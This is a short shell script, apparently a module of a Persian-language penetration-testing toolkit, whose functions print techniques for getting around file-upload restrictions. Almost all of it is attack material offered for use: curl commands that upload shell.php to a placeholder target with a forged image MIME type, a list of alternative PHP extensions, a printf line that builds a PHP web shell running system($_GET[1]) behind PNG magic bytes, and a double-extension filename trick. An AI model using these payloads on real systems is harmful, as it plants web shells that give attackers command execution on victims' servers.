DESC="دور زدن محدودیت آپلود فایل"
RISK="HIGH"

termux(){ echo "curl -F 'file=@shell.php;type=image/jpeg' https://<TARGET>/upload"; }

kali(){
cat <<'EOF'
# پسوندهای جایگزین:
# .php .php3 .php4 .php5 .phtml .phar .pHp
# دور زدن MIME:
curl -F "file=@shell.php;type=image/png" https://<TARGET>/upload
# دور زدن magic bytes:
printf '\x89PNG\r\n\x1a\n<?php system($_GET[1]); ?>' > s.php.png
# دور زدن نام:
curl -F "file=@s.php;filename=s.php.jpg" https://<TARGET>/upload
EOF
}
